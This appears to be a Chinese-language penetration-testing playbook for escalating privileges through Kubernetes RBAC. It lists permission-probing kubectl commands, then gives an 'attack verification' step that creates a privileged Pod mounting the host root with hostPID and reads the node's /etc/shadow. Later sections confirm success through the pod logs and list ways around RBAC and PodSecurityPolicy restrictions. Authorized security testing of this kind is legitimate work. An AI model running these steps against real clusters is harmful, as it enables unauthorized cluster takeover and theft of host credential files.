---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.2]
mapped_compliance_families: [RBAC权限]
---

# K8s RBAC 权限提升

## 1. 前置条件

- 当前 ServiceAccount 或用户具有可提权的 RBAC 权限
- 存在过度宽松的 ClusterRoleBinding 或 RoleBinding
- 可创建 Pod 或其他资源（利用 create pods 提权至节点）
- 可创建/修改 ClusterRole 或 ClusterRoleBinding（直接提权）

## 2. 探测命令

- [L0] `kubectl auth can-i --list` → 期望：列出当前用户/SA 的所有权限，发现高风险权限
- [L0] `kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa-name>` → 期望：列出指定 SA 的所有权限
- [L0] `kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin")'` → 期望：发现绑定到 cluster-admin 的主体
- [L0] `kubectl get rolebindings -n kube-system -o json` → 期望：检查 kube-system 命名空间的 RoleBinding
- [L1] `kubectl exec <pod> -n <ns> -- kubectl auth can-i create pods -n default --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)` → 期望：返回 yes 表示 SA 可以创建 Pod
- [L1] `kubectl exec <pod> -n <ns> -- kubectl auth can-i escalate roles -n default --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)` → 期望：返回 yes 表示 SA 可以提权

## 3. 攻击验证

- [L2] `kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa-name> -n <target-ns>` → 期望：yes（可创建特权 Pod 提权）
- [L2] `kubectl auth can-i create clusterrolebindings --as=system:serviceaccount:<ns>:<sa-name>` → 期望：yes（直接绑定 cluster-admin）
- [L2] 若 SA 可 create pods：验证能否创建特权 Pod（hostPID:hostNetwork:hostPath 挂载）→ `kubectl auth can-i create pods -n <ns>` 结合 `kubectl auth can-i use podsecuritypolicies` 验证完整提权路径
- [L2] 若 SA 可 create secrets：`kubectl auth can-i create secrets -n <ns> --as=system:serviceaccount:<ns>:<sa-name>` → 期望：yes（可创建包含恶意数据的 Secret）
- [L2] 实际攻击——创建特权 Pod 验证提权：`printf 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: priv-esc-verify\n  namespace: <ns>\nspec:\n  hostPID: true\n  hostNetwork: true\n  containers:\n  - name: test\n    image: busybox\n    command: ["cat","/proc/1/root/etc/shadow"]\n    volumeMounts:\n    - name: host\n      mountPath: /host\n  volumes:\n  - name: host\n    hostPath:\n      path: /\n' | kubectl apply -f -` → 期望：pod/priv-esc-verify created，特权 Pod 可读取宿主机 shadow 文件，确认权限提升路径
- [L2] 清理验证资源：`kubectl delete pod priv-esc-verify -n <ns> --ignore-not-found` → 期望：pod deleted

## 4. 差分证明

- 攻击前 [L0]: `kubectl get pods -n <ns> -o name | grep priv-esc-verify` → 期望：无输出（目标命名空间无攻击者创建的资源）
- 攻击前 [L0]: `kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa-name>` → 期望：权限清单显示仅有最小权限
- 攻击后 [L2]: `kubectl get pod priv-esc-verify -n <ns> -o jsonpath='{.status.phase}'` → 期望：Running（特权 Pod 创建成功）
- 攻击后 [L2]: `kubectl logs priv-esc-verify -n <ns>` → 期望：输出宿主机 shadow 文件内容（证明提权成功）

## 5. 绕过策略

- 若无法直接 create pods：检查是否可 create deploy/statefulset/daemonset（间接创建 Pod）
- 若无法直接 create clusterrolebindings：检查是否可 create rolebindings 在关键命名空间（如 kube-system）
- 若 RBAC 限制 list 但允许 get：枚举常见 Secret 名称逐个 get
- 若有 `escalate` 权限：创建比自己当前权限更高的 Role（绕过 RBAC 规则约束）
- 若可 create pods 但被 PodSecurityPolicy 限制：寻找允许的 hostPath 挂载或 hostPID 选项

## 6. 证伪条件

- [L0] `kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa-name>` 返回权限清单中无 create/update/patch/escalate 等高危动词 → 证伪
- [L0] SA 仅绑定到 view 或 edit 等受限 Role → 证伪
- [L0] 无 ClusterRoleBinding 将 SA 绑定到高权限 ClusterRole → 证伪
- [L1] SA token 不可达 API Server → 证伪

## 7. 审批级别

Level 2：探测命令（kubectl auth can-i）自动通过。
Level 3：创建验证资源自动通过（manual 模式需确认）。
核心攻击验证为 Level 3，非破坏性操作。
destructive: false

## 8. MITRE ATT&CK

T1078 - Valid Accounts（利用有效账户通过 RBAC 提权）